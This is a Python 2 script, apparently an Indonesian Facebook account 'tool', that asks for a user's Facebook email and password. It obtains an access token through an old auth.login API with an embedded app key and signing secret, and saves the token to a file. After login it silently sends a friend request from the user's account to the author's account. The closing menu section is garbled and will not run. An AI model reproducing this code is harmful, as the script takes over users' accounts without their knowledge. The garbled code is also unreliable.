# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

#-Keluar-#
def keluar():
	print "\033[1;91m[!] Exit"
	os.sys.exit()

#-Animasi-#
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)
                
##### LOGO #####
logo = """\033[1;97m_  )\
\33[1;33m  \`-.___/ _\.
\33[33;1m      __( \ \__
\33[31;1m   :  j   \O/   )
\33[31;1m   :  |  ()(__-'
\33[33;1m   ;  `-.-'  /     \33[33;1mAriefisal"
\33[31;1m    `-//__.-'\_    \33[33;1mCirebon"
\33[31;1m  : j   \O/   )    \33[33;1m081221353640"
\33[31;1m    ///       `-.
\33[37;1m   /          |
\33[37;1m  (           | /|
\33[37;1m \          |/ |
\33[37;1m `-.       U  |
\33[37;1m _I  D   \\rs'
\33[37;1m (         }
\33[37;1m `--.___.' "
\033[1;97m╔═══════════════════════════════════════╗
\033[1;97m║ \033[1;97mSelamat.Datang.Di.Tools.Kami       ║
\033[1;97m╚═══════════════════════════════════════╝"""

# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### Pilih Login #####
def masuk():
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Login"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Login using token"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
	print "\033[1;97m║"
	msuk = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if msuk =="":
		print"\033[1;91m[!] Wrong input"
		keluar()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Wrong input"
		keluar()

##### LOGIN #####
#================#
def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		print('\033[1;91m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(0.01)
			login()
			
##### TOKEN #####
def tokenz():
	os.system('reset')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
##### MENU ##########################################
def menu():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('reset')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('reset')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		keluar()
	os.system("reset")
	print logo
        print "\33[1;33m .:. "        
        print "\33[1;33m      .::::.             
        print "\33[1;33m ..         ..::::::''::         
        print "\33[1;33m  ::::..  .::''''':::    ''.      
        print "\33[1;33m  ':::::::'         '.  ..  '.    
        print "\33[1;33m  ::::::'            : '::   :   
        print "\33[1;33m  :::::     .        : ':'   :  
        print "\33[1;33m  :::::    :::       :.     .'. 
        print "\33[1;33m  .::::::    ':'     .' '.:::: : 
        print "\33[1;33m  ::::::::.         .    ::::: : 
        print "\33[1;33m  :::::    '':.... ''      '''' : 
        print "\33[1;33m  ':::: .:'              ...'' :  
        print "\33[1;33m  ..::.   '.........:::::'   :   
        print "\33[1;33m  '':::.   '::'':'':::'   .'    
        print "\33[1;33m  '..  ''.....'  ..'      
        print "\33[1;33m   ''........'' "
        print \033[1;97m╔═══════════════════════════════════════╗
        print \033[1;97m║ \033[1;97mSelamat.Datang.Di.Tools.Kami       ║
        print \033[1;97m╚═══════════════════════════════════════╝"""
